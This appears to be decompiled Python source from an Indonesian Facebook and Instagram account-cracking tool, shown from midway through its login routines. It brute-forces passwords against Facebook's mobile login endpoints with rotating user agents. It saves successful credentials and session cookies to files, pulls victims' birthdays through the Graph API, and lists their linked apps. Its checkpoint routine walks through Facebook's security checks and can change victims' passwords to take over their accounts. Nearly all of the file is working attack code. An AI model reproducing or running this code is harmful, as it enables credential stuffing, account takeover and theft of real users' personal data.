				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[ID:] %s [PSW] %s /\ %s %s %s /\ %s\n'%(H,user,pw,day,month,year,kukis))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s /\ %s /\ %s %s %s /\ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [ID:] %s [PSW] %s /\ %s %s %s /\ %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[ID:] %s [PSW] %s /\ %s '%(H,user,pw,kukis))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s /\ %s /\ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [ID:] %s [PSW] %s /\ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[ID:] %s [PSW] %s /\ %s %s %s  '%(K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s /\ %s /\ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [checkpoint] %s [PSW] %s /\ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[ID:] %s [PSW] %s           '%(K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s /\ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" [checkpoint] %s [PSW] %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.basic(user, manual, **data)
	
	# MOBILE
	def mobil(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [proses] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[ID:] %s /\ %s /\ %s %s %s /\ %s '%(H,user,pw,day,month,year,kukis))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s /\ %s /\ %s %s %s /\ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [ID:] %s /\ %s /\ %s %s %s /\ %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[ID:] %s /\ %s /\ %s '%(H,user,pw,kukis))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s /\ %s /\ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [ID:] %s /\ %s /\ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[checkpoint] %s /\ %s /\ %s %s %s  '%(K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s /\ %s /\ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" [checkpoint] %s /\ %s /\ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[checkpoint] %s /\ %s           '%(K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s /\ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" [checkpoint] %s /\ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	#os.popen('play-audio data/selesai.mp3')
	if len(ok) != 0 or len(cp) != 0:
		print("\n%s√ hasilnya mayan kan?"%(H))
		print('%s+%s --------------------alfin-------------------- %s+'%(P,M,P))
		print('%s• %sOK%s : %s%s'%(U,H,M,H,str(len(ok))))
		print('%s• %sCP%s : %s%s'%(U,K,M,K,str(len(cp))))
		print('%s+%s -----------------------ofc------------------- %s+'%(P,M,P))
		if len(cp)==0:
			exit()
		else:
			c = input('\n%s%s%s gunakan detektor checkpoint? y/t%s > %s'%(U,til,O,M,K))
			if c =='':
				exit("%s%s Isi yang benar kentod "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
				pw=input("%s%s%s ubah sandi akun one tab? y/t %s> %s"%(U,til,O,M,K))
				if pw =='':
					print ("%s%s isi yg benar kentod "%(M,til))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
					if len(pw2) <= 5:
						print("%s%s sandi minimal 6 karakter "%(M,til))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					akun = fb.replace("\n","")
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
					try:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s• tidak ada koneksi "%(M)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
				#os.popen('play-audio data/cek.mp3')
				input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
				pilihan().menu()
			elif c in['t','T']:
				exit()
			else:
				exit ("%s%s isi yg benar kentod "%(M,til))
	else:
		exit(f"\n{M}{til} Ops... tidak mendapatkan hasil :(")

# CEK APLIKASI 
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

# CEKPOINT DETEKTOR
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
	try:
		print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s• file tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s• sandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
	#os.popen('play-audio data/cek.mp3')
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	pilihan().menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s• akun terkunci sesi new"%(M))
		else:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			#os.popen('play-audio dapet.mp3')
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s akun one tab, sandi berhasil di ubah \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
						#os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s akun one tab, silahkan anda login		"%(H,til))
					#os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s terjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
				#os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	else:
		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
		
#HAPUS HASIL
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	print ('');jeda(2)
	jalan (H+' √ berhasil menghapus hasil crack ');jeda(2)
	pilihan().menu()
	
# CEK HASIL
def hasill():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	
def cek_cek(rom):
	if rom in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
	elif rom in['1','01']:
		hasil_fb()
	elif rom in['2','02']:
		hasil_igehh()
	elif rom in['03','3']:
		hapus_hasil()
	elif rom in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
# CEK HASIL FACEBOOK
def hasil_fb():
	hasill()
	l = input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
	if l in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s# %s════════════════════════════════ %s#%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s'%(file))
		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalcp = open('CP/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
		print(" %s# %s════════════════════════════════ %s#%s"%(P,M,P,K));jeda(2)
		os.system('cat CP/%s'%(file))
		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
# CEK HASIL IGEH
def hasil_igehh():
	print('')
	for i in os.listdir('IG'):
		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
	try:
		c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
		if c in['']:
			exit("\n%s• isi yang benar kentod"%(M))
		g=open("IG/%s"%(c)).read().splitlines()
	except FileNotFoundError:
		exit("\n%s• file tidak tersedia"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
	for s in g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
		fol=s.split("|")[2]
		ful=s.split("|")[3]
		if xc=="CP":
			print(f"""{J}╔══[ {K}Checkpoint                      
{J}║══[ {K}Username  {M}> {K}{usr}{C}
{J}║══[ {K}Password  {M}> {K}{pwd}{C}
{J}║══[ {K}Followers {M}> {K}{fol}{C}
{J}╚══[ {K}Following {M}> {K}{ful}{C}
			""");jeda(0.05)
		else:
			print(f"""{J}╔══[ {H}Berhasil                      
{J}║══[ {H}Username  {M}> {H}{usr}{C}
{J}║══[ {H}Password  {M}> {H}{pwd}{C}
{J}║══[ {H}Followers {M}> {H}{fol}{C}
{J}╚══[ {H}Following {M}> {H}{ful}{C}
			""");jeda(0.05)

if __name__=="__main__":
	()
	
"""

    Biar apa sih di decompile anyink
    Taekkk !

"""
